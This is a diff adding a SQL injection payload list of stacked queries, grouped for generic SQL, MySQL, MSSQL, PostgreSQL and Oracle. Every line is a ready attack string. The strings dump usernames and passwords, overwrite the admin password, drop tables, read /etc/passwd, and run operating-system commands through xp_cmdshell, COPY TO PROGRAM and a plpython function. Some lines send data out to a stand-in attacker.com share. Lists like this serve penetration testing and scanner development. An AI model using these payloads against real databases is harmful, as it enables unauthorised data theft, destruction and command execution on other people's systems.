@@ -1,0 +1,32 @@
+# SQLi Stacked Queries Payloads
+'; SELECT 1--
+'; SELECT version()--
+'; SELECT user()--
+'; SELECT database()--
+'; SELECT @@version--
+'; SELECT * FROM users--
+'; SELECT username,password FROM users--
+'; INSERT INTO users(username,password) VALUES('test','test')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; DELETE FROM users WHERE username='test'--
+'; DROP TABLE IF EXISTS temp_sqli--
+'; CREATE TABLE temp_sqli(data TEXT)--
+'; CREATE TABLE temp_sqli AS SELECT * FROM users--
+# MySQL stacked
+';SELECT SLEEP(5)--
+';SELECT IF(1=1,SLEEP(5),0)--
+';SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/out.txt'--
+# MSSQL stacked
+';EXEC xp_cmdshell 'whoami'--
+';EXEC sp_configure 'show advanced options',1;RECONFIGURE--
+';EXEC master..xp_cmdshell 'dir'--
+';DECLARE @q VARCHAR(200);SET @q='\\attacker.com\share\out';EXEC master..xp_dirtree @q--
+';EXEC sp_makewebtask '\\attacker.com\share\out.html','SELECT * FROM users'--
+# PostgreSQL stacked
+';COPY (SELECT '') TO PROGRAM 'id'--
+';CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpython3u--
+';SELECT lo_import('/etc/passwd')--
+';CREATE TABLE cmd_exec(cmd_output TEXT);COPY cmd_exec FROM PROGRAM 'id'--
+# Oracle stacked
+';EXECUTE IMMEDIATE 'SELECT 1 FROM dual'--
+';BEGIN DBMS_LOCK.SLEEP(5); END;--
